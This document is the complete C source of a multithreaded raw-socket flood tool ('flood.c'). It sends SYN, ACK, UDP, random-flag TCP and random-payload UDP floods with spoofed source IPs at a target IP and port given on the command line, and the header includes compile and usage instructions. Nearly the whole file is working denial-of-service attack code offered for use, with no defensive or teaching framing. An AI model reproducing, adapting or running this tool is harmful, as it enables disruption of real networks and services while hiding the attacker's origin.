/*
 * flood.c — raw socket flood tool
 * supports: SYN, ACK, UDP, TCP-RAW, UDP-RAW
 * spoofed source IP, multithreaded
 *
 * compile: gcc -o flood flood.c -lpthread -O2
 * usage:   ./flood <target_ip> <target_port> <method> [threads] [duration_sec]
 * methods: syn, ack, udp, tcpraw, udpraw
 * example: ./flood 192.168.1.1 80 syn 4 60
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

/* ── globals ────────────────────────────────────── */

static volatile int g_running = 1;
static unsigned long long g_packets_sent = 0;
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;

typedef enum {
    METHOD_SYN,
    METHOD_ACK,
    METHOD_UDP,
    METHOD_TCP_RAW,
    METHOD_UDP_RAW
} flood_method_t;

typedef struct {
    char           target_ip[INET_ADDRSTRLEN];
    uint16_t       target_port;
    flood_method_t method;
    int            thread_id;
} thread_ctx_t;

/* ── checksum ───────────────────────────────────── */

static uint16_t checksum(uint16_t *buf, int nwords) {
    unsigned long sum = 0;
    while (nwords > 0) {
        sum += *buf++;
        nwords--;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

/* pseudo-header for TCP/UDP checksum */
struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t  zero;
    uint8_t  proto;
    uint16_t len;
};

static uint16_t tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    struct pseudo_header ph;
    char buf[4096];
    int tcp_len = sizeof(struct tcphdr);

    ph.src   = iph->saddr;
    ph.dst   = iph->daddr;
    ph.zero  = 0;
    ph.proto = IPPROTO_TCP;
    ph.len   = htons(tcp_len);

    memset(buf, 0, sizeof(buf));
    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), tcph, tcp_len);

    return checksum((uint16_t *)buf, (sizeof(ph) + tcp_len + 1) / 2);
}

static uint16_t udp_checksum(struct iphdr *iph, struct udphdr *udph, char *payload, int payload_len) {
    struct pseudo_header ph;
    char buf[4096];
    int udp_len = sizeof(struct udphdr) + payload_len;

    ph.src   = iph->saddr;
    ph.dst   = iph->daddr;
    ph.zero  = 0;
    ph.proto = IPPROTO_UDP;
    ph.len   = htons(udp_len);

    memset(buf, 0, sizeof(buf));
    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), udph, sizeof(struct udphdr));
    if (payload_len > 0)
        memcpy(buf + sizeof(ph) + sizeof(struct udphdr), payload, payload_len);

    return checksum((uint16_t *)buf, (sizeof(ph) + udp_len + 1) / 2);
}

/* ── random IP ──────────────────────────────────── */

static uint32_t rand_ip(void) {
    uint8_t a, b, c, d;
    do {
        a = rand() % 256;
    } while (a == 10 || a == 127 || a == 0 || a == 255);
    b = rand() % 256;
    c = rand() % 256;
    d = 1 + (rand() % 254);
    return (a << 24) | (b << 16) | (c << 8) | d;
}

/* ── build IP header ────────────────────────────── */

static void build_ip(struct iphdr *iph, uint32_t src, uint32_t dst,
                     uint8_t proto, uint16_t total_len) {
    iph->ihl      = 5;
    iph->version   = 4;
    iph->tos       = 0;
    iph->tot_len   = htons(total_len);
    iph->id        = htons(rand() % 65535);
    iph->frag_off  = 0;
    iph->ttl       = 64 + (rand() % 64);
    iph->protocol  = proto;
    iph->check     = 0;
    iph->saddr     = src;
    iph->daddr     = dst;
    iph->check     = checksum((uint16_t *)iph, sizeof(struct iphdr) / 2);
}

/* ── SYN flood ──────────────────────────────────── */

static void flood_syn(int sock, struct sockaddr_in *dst, thread_ctx_t *ctx) {
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr  *iph  = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    while (g_running) {
        memset(packet, 0, sizeof(packet));

        uint32_t src_ip = htonl(rand_ip());
        uint16_t src_port = htons(1024 + (rand() % 64511));

        build_ip(iph, src_ip, dst->sin_addr.s_addr, IPPROTO_TCP, sizeof(packet));

        tcph->source  = src_port;
        tcph->dest    = htons(ctx->target_port);
        tcph->seq     = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff    = 5;
        tcph->syn     = 1;
        tcph->window  = htons(65535);
        tcph->check   = 0;
        tcph->urg_ptr = 0;
        tcph->check   = tcp_checksum(iph, tcph);

        sendto(sock, packet, sizeof(packet), 0,
               (struct sockaddr *)dst, sizeof(*dst));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }
}

/* ── ACK flood ──────────────────────────────────── */

static void flood_ack(int sock, struct sockaddr_in *dst, thread_ctx_t *ctx) {
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr  *iph  = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    while (g_running) {
        memset(packet, 0, sizeof(packet));

        uint32_t src_ip = htonl(rand_ip());
        uint16_t src_port = htons(1024 + (rand() % 64511));

        build_ip(iph, src_ip, dst->sin_addr.s_addr, IPPROTO_TCP, sizeof(packet));

        tcph->source  = src_port;
        tcph->dest    = htons(ctx->target_port);
        tcph->seq     = htonl(rand());
        tcph->ack_seq = htonl(rand());
        tcph->doff    = 5;
        tcph->ack     = 1;
        tcph->window  = htons(65535);
        tcph->check   = 0;
        tcph->urg_ptr = 0;
        tcph->check   = tcp_checksum(iph, tcph);

        sendto(sock, packet, sizeof(packet), 0,
               (struct sockaddr *)dst, sizeof(*dst));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }
}

/* ── UDP flood ──────────────────────────────────── */

static void flood_udp(int sock, struct sockaddr_in *dst, thread_ctx_t *ctx) {
    /* random payload to vary packet signature */
    char payload[1024];
    int payload_len = 512 + (rand() % 512);

    char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 1024];
    struct iphdr  *iph  = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    while (g_running) {
        memset(packet, 0, sizeof(packet));

        payload_len = 512 + (rand() % 512);
        for (int i = 0; i < payload_len; i++)
            payload[i] = rand() % 256;
        memcpy(data, payload, payload_len);

        uint32_t src_ip = htonl(rand_ip());
        uint16_t src_port = htons(1024 + (rand() % 64511));
        int total = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;

        build_ip(iph, src_ip, dst->sin_addr.s_addr, IPPROTO_UDP, total);

        udph->source = src_port;
        udph->dest   = htons(ctx->target_port);
        udph->len    = htons(sizeof(struct udphdr) + payload_len);
        udph->check  = 0;
        udph->check  = udp_checksum(iph, udph, payload, payload_len);

        sendto(sock, packet, total, 0,
               (struct sockaddr *)dst, sizeof(*dst));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }
}

/* ── raw TCP (random flags) ─────────────────────── */

static void flood_tcp_raw(int sock, struct sockaddr_in *dst, thread_ctx_t *ctx) {
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr  *iph  = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    while (g_running) {
        memset(packet, 0, sizeof(packet));

        uint32_t src_ip = htonl(rand_ip());
        uint16_t src_port = htons(1024 + (rand() % 64511));

        build_ip(iph, src_ip, dst->sin_addr.s_addr, IPPROTO_TCP, sizeof(packet));

        tcph->source  = src_port;
        tcph->dest    = htons(ctx->target_port);
        tcph->seq     = htonl(rand());
        tcph->ack_seq = htonl(rand());
        tcph->doff    = 5;

        /* random TCP flags for maximum confusion */
        uint8_t flags = rand() % 64;
        tcph->fin = (flags >> 0) & 1;
        tcph->syn = (flags >> 1) & 1;
        tcph->rst = (flags >> 2) & 1;
        tcph->psh = (flags >> 3) & 1;
        tcph->ack = (flags >> 4) & 1;
        tcph->urg = (flags >> 5) & 1;

        tcph->window  = htons(rand() % 65535);
        tcph->check   = 0;
        tcph->urg_ptr = 0;
        tcph->check   = tcp_checksum(iph, tcph);

        sendto(sock, packet, sizeof(packet), 0,
               (struct sockaddr *)dst, sizeof(*dst));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }
}

/* ── raw UDP (random payload sizes) ─────────────── */

static void flood_udp_raw(int sock, struct sockaddr_in *dst, thread_ctx_t *ctx) {
    char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 1400];
    struct iphdr  *iph  = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    while (g_running) {
        memset(packet, 0, sizeof(packet));

        int payload_len = 64 + (rand() % 1336);
        for (int i = 0; i < payload_len; i++)
            data[i] = rand() % 256;

        uint32_t src_ip = htonl(rand_ip());
        uint16_t src_port = htons(rand() % 65535);
        int total = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;

        build_ip(iph, src_ip, dst->sin_addr.s_addr, IPPROTO_UDP, total);

        udph->source = src_port;
        udph->dest   = htons(ctx->target_port);
        udph->len    = htons(sizeof(struct udphdr) + payload_len);
        udph->check  = 0;
        udph->check  = udp_checksum(iph, udph, data, payload_len);

        sendto(sock, packet, total, 0,
               (struct sockaddr *)dst, sizeof(*dst));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }
}

/* ── thread entry ───────────────────────────────── */

static void *thread_entry(void *arg) {
    thread_ctx_t *ctx = (thread_ctx_t *)arg;

    /* raw socket — IP_HDRINCL so we craft the entire packet */
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[!] socket");
        return NULL;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(ctx->target_port);
    inet_pton(AF_INET, ctx->target_ip, &dst.sin_addr);

    switch (ctx->method) {
        case METHOD_SYN:     flood_syn(sock, &dst, ctx);      break;
        case METHOD_ACK:     flood_ack(sock, &dst, ctx);      break;
        case METHOD_UDP:     flood_udp(sock, &dst, ctx);      break;
        case METHOD_TCP_RAW: flood_tcp_raw(sock, &dst, ctx);  break;
        case METHOD_UDP_RAW: flood_udp_raw(sock, &dst, ctx);  break;
    }

    close(sock);
    return NULL;
}

/* ── signal handler ─────────────────────────────── */

static void sig_handler(int sig) {
    (void)sig;
    g_running = 0;
    printf("\n[*] stopping...\n");
}

/* ── stats thread ───────────────────────────────── */

static void *stats_thread(void *arg) {
    (void)arg;
    unsigned long long last = 0;
    while (g_running) {
        sleep(1);
        pthread_mutex_lock(&g_lock);
        unsigned long long cur = g_packets_sent;
        pthread_mutex_unlock(&g_lock);
        printf("[*] pps: %llu | total: %llu\n", cur - last, cur);
        last = cur;
    }
    return NULL;
}

/* ── main ───────────────────────────────────────── */

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("usage: %s <target_ip> <target_port> <method> [threads] [duration]\n", argv[0]);
        printf("methods: syn, ack, udp, tcpraw, udpraw\n");
        printf("example: %s 1.2.3.4 80 syn 4 60\n", argv[0]);
        return 1;
    }

    char *target_ip    = argv[1];
    uint16_t port      = (uint16_t)atoi(argv[2]);
    char *method_str   = argv[3];
    int num_threads    = argc > 4 ? atoi(argv[4]) : 1;
    int duration       = argc > 5 ? atoi(argv[5]) : 0; /* 0 = indefinite */

    if (num_threads < 1) num_threads = 1;
    if (num_threads > 256) num_threads = 256;

    flood_method_t method;
    if      (strcmp(method_str, "syn") == 0)    method = METHOD_SYN;
    else if (strcmp(method_str, "ack") == 0)    method = METHOD_ACK;
    else if (strcmp(method_str, "udp") == 0)    method = METHOD_UDP;
    else if (strcmp(method_str, "tcpraw") == 0) method = METHOD_TCP_RAW;
    else if (strcmp(method_str, "udpraw") == 0) method = METHOD_UDP_RAW;
    else {
        fprintf(stderr, "[!] unknown method: %s\n", method_str);
        return 1;
    }

    /* verify target IP */
    struct in_addr tmp;
    if (inet_pton(AF_INET, target_ip, &tmp) != 1) {
        fprintf(stderr, "[!] invalid IP: %s\n", target_ip);
        return 1;
    }

    srand(time(NULL) ^ getpid());
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    printf("[*] target: %s:%d\n", target_ip, port);
    printf("[*] method: %s\n", method_str);
    printf("[*] threads: %d\n", num_threads);
    printf("[*] duration: %s\n", duration > 0 ? argv[5] : "infinite");
    printf("[*] launching...\n");

    /* stats */
    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, NULL);

    /* worker threads */
    pthread_t *tids = malloc(num_threads * sizeof(pthread_t));
    thread_ctx_t *ctxs = malloc(num_threads * sizeof(thread_ctx_t));

    for (int i = 0; i < num_threads; i++) {
        strncpy(ctxs[i].target_ip, target_ip, INET_ADDRSTRLEN);
        ctxs[i].target_port = port;
        ctxs[i].method      = method;
        ctxs[i].thread_id   = i;
        pthread_create(&tids[i], NULL, thread_entry, &ctxs[i]);
    }

    /* duration timer */
    if (duration > 0) {
        sleep(duration);
        g_running = 0;
    }

    /* wait */
    for (int i = 0; i < num_threads; i++)
        pthread_join(tids[i], NULL);
    pthread_join(stats_tid, NULL);

    printf("[*] done. total packets: %llu\n", g_packets_sent);

    free(tids);
    free(ctxs);
    return 0;
}
